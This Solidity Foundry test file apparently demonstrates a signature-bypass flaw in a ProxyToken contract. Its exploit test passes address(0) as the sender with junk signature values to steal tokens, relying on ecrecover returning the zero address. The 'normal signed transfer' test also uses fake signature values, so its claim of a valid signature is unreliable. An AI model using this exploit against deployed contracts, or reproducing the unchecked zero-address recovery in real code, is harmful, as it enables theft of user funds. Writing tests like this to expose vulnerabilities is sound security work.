// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ProxyToken.sol";

contract ProxyTokenTest is Test {
    ProxyToken token;
    address admin = address(0x1);
    address user = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        token = new ProxyToken();
        vm.prank(admin);
        token.transfer(user, 1000e18);
    }

    function testZeroAddressExploit() public {
        // Attacker tries to transfer from address(0)
        vm.prank(attacker);
        bool success = token.transferProxy(
            address(0),      // _from = address(0)
            attacker,        // _to = attacker
            1000e18,         // _value
            0,               // _fee
            27,              // _v = garbage
            keccak256("r"),  // _r = garbage
            keccak256("s")   // _s = garbage
        );

        // Attack succeeds because of the vulnerability
        assertTrue(success);
        assertEq(token.balanceOf(attacker), 1000e18);
    }

    function testNormalTransfer() public {
        // Normal signed transfer works
        vm.prank(user);
        bool success = token.transferProxy(
            user,
            admin,
            100e18,
            0,
            27,
            keccak256("valid_r"),
            keccak256("valid_s")
        );
        assertTrue(success);
    }
}